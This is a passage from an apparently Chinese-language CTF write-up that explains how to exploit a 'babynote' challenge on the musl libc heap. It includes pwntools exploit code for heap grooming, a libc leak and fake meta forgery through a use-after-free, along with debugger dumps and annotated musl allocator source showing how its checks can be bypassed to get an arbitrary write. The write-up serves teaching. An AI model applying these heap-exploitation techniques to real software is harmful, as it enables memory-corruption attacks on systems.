class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#slot full size is 0x2c</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x50</span>)<span class=\"comment\">#slot full size is 0x6c</span></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;a&#x27;</span>)\t\t\t\t<span class=\"comment\">#free the first note,the meta(0xc)is freed,</span></span><br><span class=\"line\">clean()\t\t\t\t\t<span class=\"comment\">#now meta(0x2c) has one no use,and 1 freed,meta(0xc) heav 3 freed</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>)\t\t<span class=\"comment\">#we alloc the last slot in meta(0x2c) for abynote,</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"comment\">#.Reuse the 0 solt in meta(0xc) (malloc from bins),</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"comment\">#then reuse the free slot in meta(0x2c)</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>,<span class=\"string\">b&#x27;b&#x27;</span>)\t\t\t<span class=\"comment\">#malloc a slot(0x2c) in a new meta2(0x2c,and malloc 2 slot(0xc) in meta(0xc)</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;a&#x27;</span>)\t\t\t<span class=\"comment\">#malloc a new slot(0xc),in meta(0xc),then free babynote a,then meta1(0x2c) will have 2 freed slot</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#malloc 3slot from  meta2(0x2c),so meta1(0x2c),have 2 freed slot</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;e&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;e&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#fill up meta2(0x2c)</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;f&#x27;</span>,<span class=\"string\">b&#x27;f&#x27;</span>*<span class=\"number\">0x50</span>)\t\t<span class=\"comment\">#malloc a baby note from meta1(0x2c),meta1(0x2c) still have one freed, </span></span><br><span class=\"line\"></span><br><span class=\"line\">find(<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;0x28:&quot;</span>)</span><br><span class=\"line\">ss = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">\tss = r.recv(<span class=\"number\">2</span>)+ss</span><br><span class=\"line\">ss  = <span class=\"string\">b&#x27;0x&#x27;</span>+ss</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ss)</span><br><span class=\"line\">libcbase = <span class=\"built_in\">int</span>(ss,<span class=\"number\">16</span>) -  <span class=\"number\">0x29fdf0</span></span><br><span class=\"line\">stdout = libcbase + <span class=\"number\">0x2a0e00</span></span><br><span class=\"line\">system = libcbase + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">__malloc_context = <span class=\"number\">0x2a1aa0</span>+libcbase</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libcbase : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system : &quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;stdout : &quot;</span>,<span class=\"built_in\">hex</span>(stdout))</span><br></pre></td></tr></table></figure>\n<h3 id=\"泄露其他地址meta\"><a class=\"markdownIt-Anchor\" href=\"#泄露其他地址meta\">#</a> 泄露其他地址（meta）</h3>\n<p>这里，meta1 (0x2c) 还有一个 freed slot ，我们其实就是通过这个泄露的 heap。find 一个很重要的点就是，会 addname. 而且就算查不到也不出错，然后再将其释放，所以我们可以由此来重复利用这个 freed slot。find 的时候，这要 size 合适，就会将它返回给我们，然后在里面写入数据。并释放。之前我们说过，这里可以泄露 heap 地址，是因为他是我们 list 的最后一个 banynote,delete 后上一个 babynote 的 next 指针依旧指向这个 slot，所以导致泄露。</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220420203251874.png\" alt=\"image-20220420203251874\"></p>\n<p>所以我们可以进行任意地址读。将__malloc_context 的地址写在 note 的位置，就可以泄露，同时我们还可以改变 notesize, 控制泄露的长度。</p>\n<p>由于 musl 的堆管理机制，虽然与 glibc 完全不一样，但是感觉通过代码分析是更容易的。</p>\n<h3 id=\"任意地址写\"><a class=\"markdownIt-Anchor\" href=\"#任意地址写\">#</a> 任意地址写</h3>\n<p>musl 的任意地址写与 glibc 的 unlink 核心想法一致，只不过是前面的检查方式不一样。我们一步步来分析。</p>\n<p>首先 musl 的堆块不会进入 bins，只有 meta 被释放的时候，才会加入 freed_meta 双链表。当 meta 分配出去的 slot 全部被释放的时候，meta 会被释放。</p>\n<h4 id=\"meta的-结构\"><a class=\"markdownIt-Anchor\" href=\"#meta的-结构\">#</a> meta 的 结构</h4>\n<p>meta 结构一共占用 40bytes</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> meta*)<span class=\"number\">0x55555730d4f0</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  prev = <span class=\"number\">0x55555730d4f0</span>, </span><br><span class=\"line\">  next = <span class=\"number\">0x55555730d4f0</span>, </span><br><span class=\"line\">  mem = <span class=\"number\">0x7f6431216c30</span>, </span><br><span class=\"line\">  avail_mask = <span class=\"number\">262</span>, </span><br><span class=\"line\">  freed_mask = <span class=\"number\">0</span>, </span><br><span class=\"line\">  last_idx = <span class=\"number\">9</span>, </span><br><span class=\"line\">  freeable = <span class=\"number\">1</span>, </span><br><span class=\"line\">  sizeclass = <span class=\"number\">2</span>, </span><br><span class=\"line\">  maplen = <span class=\"number\">0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">pwndbg&gt; x/8gx 0x55555730d4f0</span></span><br><span class=\"line\"><span class=\"comment\">0x55555730d4f0:\t0x000055555730d4f0\t0x000055555730d4f0</span></span><br><span class=\"line\"><span class=\"comment\">0x55555730d500:\t0x00007f6431216c30\t0x0000000000000106</span></span><br><span class=\"line\"><span class=\"comment\">0x55555730d510:\t0x00000000000000a9</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>prev 与 next 分别指向上一个或者下一个 meta（meta 在 freed_meta 链表中）。mem 指向管理 meta 的 group，而 group 又包含的一下简单信息</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> group*)<span class=\"number\">0x55555730d4f0</span></span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;</span><br><span class=\"line\">  meta = <span class=\"number\">0x55555730d4f0</span>, </span><br><span class=\"line\">  active_idx = <span class=\"number\">16</span> <span class=\"string\">&#x27;\\020&#x27;</span>, </span><br><span class=\"line\">  pad = <span class=\"string\">&quot;\\324\\060WUU\\000&quot;</span>, </span><br><span class=\"line\">  storage = <span class=\"number\">0x55555730d500</span> <span class=\"string\">&quot;0l!1d\\177&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>其中很多信息我们不需要管信息，只要知道用户的使用的 slot 数据在 storage 里面。这里提一下，group 其实也可以看作是一个 slot，被另一个 “meta” 管理，这里提到这个是因为，free meta 的时候，除了会释放对应的 slot，还要释放对应的 group。slot 的储存结构也比较有意思，他并不会像 glibc 的 chunk 那样保留过多的本 slot 信息，只会用四字节来保留 slot 与 meta 的关系。</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422192430250.png\" alt=\"image-20220422192430250\"></p>\n<p>1 这里是用户使用的区域，2 是 group 的信息，包括 meta</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> group*)<span class=\"number\">0x7f6431216c30</span></span><br><span class=\"line\">$<span class=\"number\">4</span> = &#123;</span><br><span class=\"line\">  meta = <span class=\"number\">0x55555730d4f0</span>, </span><br><span class=\"line\">  active_idx = <span class=\"number\">9</span> <span class=\"string\">&#x27;\\t&#x27;</span>, </span><br><span class=\"line\">  pad = <span class=\"string\">&quot;\\000\\000\\000\\000\\200\\000&quot;</span>, </span><br><span class=\"line\">  storage = <span class=\"number\">0x7f6431216c40</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>然后，3 这，他也只想一个地址，这里你也是一个 meta，与后面 group 的 free 有关。</p>\n<p>slot 的堆头会保留与 base 的偏移，以及 slot 在 group 组的编号，通过偏移找到 base，也就是 group 的地址。</p>\n<p>下面我们来说检查，要想把 fake_meta 释放掉，要保证 meta 只有一个 freeadble, 可以是只有 1 个 slot，也可以是其他状况，因为这个会涉及 meta 的 avail_mask 以及 freed_mask，我建议是把 freed_mask 写成 0，这样在 free 函数里的一个循环时，直接跳出，减少工作量。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// atomic free without locking if this is neither first or last slot</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> mask = freed | avail;</span><br><span class=\"line\">\tassert(!(mask&amp;self));</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!freed || mask+self==all) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!MT)</span><br><span class=\"line\">\t\tg-&gt;freed_mask = freed+self;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class=\"line\">\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面提到的根据用户指针找到对应的 meta，在 free 函数里被封装在 get_meta () 函数里，这里也是我们的第一个检查。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"keyword\">struct</span> meta *<span class=\"title function_\">get_meta</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *p)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tassert(!((<span class=\"type\">uintptr_t</span>)p &amp; <span class=\"number\">15</span>));</span><br><span class=\"line\">\t<span class=\"type\">int</span> offset = *(<span class=\"type\">const</span> <span class=\"type\">uint16_t</span> *)(p - <span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> index = get_slot_index(p);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p[<span class=\"number\">-4</span>]) &#123;</span><br><span class=\"line\">\t\tassert(!offset);</span><br><span class=\"line\">\t\toffset = *(<span class=\"type\">uint32_t</span> *)(p - <span class=\"number\">8</span>);</span><br><span class=\"line\">\t\tassert(offset &gt; <span class=\"number\">0xffff</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">group</span> *<span class=\"title\">base</span> =</span> (<span class=\"type\">const</span> <span class=\"type\">void</span> *)(p - UNIT*offset - UNIT);\t\t\t\t\t\t<span class=\"comment\">//UNIT = 16</span></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">meta</span> =</span> base-&gt;meta;</span><br><span class=\"line\">\tassert(meta-&gt;mem == base);</span><br><span class=\"line\">\tassert(index &lt;= meta-&gt;last_idx);</span><br><span class=\"line\">\tassert(!(meta-&gt;avail_mask &amp; (<span class=\"number\">1u</span>&lt;&lt;index)));</span><br><span class=\"line\">\tassert(!(meta-&gt;freed_mask &amp; (<span class=\"number\">1u</span>&lt;&lt;index)));</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta_area</span> *<span class=\"title\">area</span> =</span> (<span class=\"type\">void</span> *)((<span class=\"type\">uintptr_t</span>)meta &amp; <span class=\"number\">-4096</span>);</span><br><span class=\"line\">\tassert(area-&gt;check == ctx.secret);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (meta-&gt;sizeclass &lt; <span class=\"number\">48</span>) &#123;</span><br><span class=\"line\">\t\tassert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class=\"line\">\t\tassert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class=\"number\">1</span>));</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tassert(meta-&gt;sizeclass == <span class=\"number\">63</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (meta-&gt;maplen) &#123;</span><br><span class=\"line\">\t\tassert(offset &lt;= meta-&gt;maplen*<span class=\"number\">4096UL</span>/UNIT - <span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"keyword\">struct</span> meta *)meta;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一些 offset，idx 的设置其实有相关的计算方式，但是为了方便，我们伪造的之前，可以把利用程序做一个真实的对布局，然后直接把 group，meta 的结构体中的使用位的参数复制出来。这样就可以很方便的跳过检查。我们将 fake 伪造在一个大的堆块上，fake 会根据 const struct meta *meta = base-&gt;meta; 来查询到，下面我们还要伪造一个 meta_area 结构体，这个结构体保留了__malloc_context 的 secret，然后这个 area 是 0x1000 字节对齐的，const struct meta_area *area = (void *)((uintptr_t) meta &amp; -4096);，这个跟我们的 fake_meta 的地址是相关联的，所以我们需要在一个 0x1000 字节对齐的地方布置一个 fake_meta_area, 主要就是把 secret 写进去，绕过检查。这里并不会检查 meta 的 prev 以及 next 是否合法，所以这里有一个任意地址的写。把 prev 地址 + 8 写为 next 的值。释放 slot 的检查基本就结束，因为我们伪造的 slot 的头，以及 fake_meta 都是真实的样子，然后还有一个关键的检查是在 dequeue (unlink) 之后 free_group，这里会将 group 指针作为一个 slot 指针，进行 free。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> mapinfo <span class=\"title function_\">nontrivial_free</span><span class=\"params\">(<span class=\"keyword\">struct</span> meta *g, <span class=\"type\">int</span> i)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> self = <span class=\"number\">1u</span>&lt;&lt;i;</span><br><span class=\"line\">\t<span class=\"type\">int</span> sc = g-&gt;sizeclass;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (mask+self == (<span class=\"number\">2u</span>&lt;&lt;g-&gt;last_idx)<span class=\"number\">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// any multi-slot group is necessarily on an active list</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// here, but single-slot groups might or might not be.</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (g-&gt;next) &#123;</span><br><span class=\"line\">\t\t\tassert(sc &lt; <span class=\"number\">48</span>);</span><br><span class=\"line\">\t\t\t<span class=\"type\">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class=\"line\">\t\t\tdequeue(&amp;ctx.active[sc], g);\t\t\t\t\t<span class=\"comment\">//任意地址写</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class=\"line\">\t\t\t\tactivate_group(ctx.active[sc]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> free_group(g);</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!mask) &#123;</span><br><span class=\"line\">\t\tassert(sc &lt; <span class=\"number\">48</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">// might still be active if there were no allocations</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// after last available slot was taken.</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (ctx.active[sc] != g) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">queue</span>(&amp;ctx.active[sc], g);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">dequeue</span><span class=\"params\">(<span class=\"keyword\">struct</span> meta **phead, <span class=\"keyword\">struct</span> meta *m)</span>\t\t\t\t<span class=\"comment\">//unlink the meta</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m-&gt;next != m) &#123;\t\t\t\t\t\t\t<span class=\"comment\">//meta is freed</span></span><br><span class=\"line\">\t\tm-&gt;prev-&gt;next = m-&gt;next;</span><br><span class=\"line\">\t\tm-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t*phead = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tm-&gt;prev = m-&gt;next = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>就是我们上面图片的 3 号位置。这个是 group 对应的 meta, 这里利用同样的手段伪造一个 fake_meta_area 以及一个 meta, 只需要在另外一个 0x1000 字节对齐的空间布置下 secret，后面布置 fake_meta2 就可以了。因为这里的检查也主要是 get_meta (). 最后 free_meta ()</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">free_meta</span><span class=\"params\">(<span class=\"keyword\">struct</span> meta *m)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t*m = (<span class=\"keyword\">struct</span> meta)&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">queue</span>(&amp;ctx.free_meta_head, m);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">queue</span><span class=\"params\">(<span class=\"keyword\">struct</span> meta **phead, <span class=\"keyword\">struct</span> meta *m)</span>\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"comment\">//inser m in the front of queue,but it will not change the phead ptr </span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tassert(!m-&gt;next);</span><br><span class=\"line\">\tassert(!m-&gt;prev);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (*phead) &#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">meta</span> *<span class=\"title\">head</span> =</span> *phead;</span><br><span class=\"line\">\t\tm-&gt;next = head;</span><br><span class=\"line\">\t\tm-&gt;prev = head-&gt;prev;</span><br><span class=\"line\">\t\tm-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tm-&gt;prev = m-&gt;next = m;</span><br><span class=\"line\">\t\t*phead = m;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>没有什么其他检查。</p>\n<h4 id=\"利用-2\"><a class=\"markdownIt-Anchor\" href=\"#利用-2\">#</a> 利用</h4>\n<p>回到题目，我们利用 UAF,</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;h&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;h&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fakebabynote = p64( <span class=\"number\">0x29fdd0</span> +libcbase)+p64(fakemeta_addr+<span class=\"number\">0x50</span>)+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0x28</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;i&#x27;</span>,fakebabynote)</span><br><span class=\"line\">free(<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">add(p64(<span class=\"number\">0x29bd00</span>+libcbase)*<span class=\"number\">2</span>+p64(<span class=\"number\">0x8</span>)+p64(<span class=\"number\">0x8</span>)+p64(libcbase+<span class=\"number\">0x29bd90</span>),fake_meta.ljust(<span class=\"number\">0x2000</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">free(<span class=\"string\">b&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>group 里的第一个 slot 开始被用作存放 banynote1，next 指针指向 0，babynotelist 头插法之后删掉第一个创建的 babynote，然后堆风水将 slot0（原本作为 babynote）作为 name 或者 note 堆块，可以写入数据，但是因为存在 uaf, 虽然 slot0 作为链表头的 name 或者 note, 但是依旧可以链表的遍历将他看成一个节点，我们还可以将其 next 指针写为我们 kafechunk 的地址，这个 fakechunk 其实是一个 babynote 的 name 或者 note，只是伪造成了 bebynote 的布局，对应 note 之指针指向我们布局好的 fakeslot</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 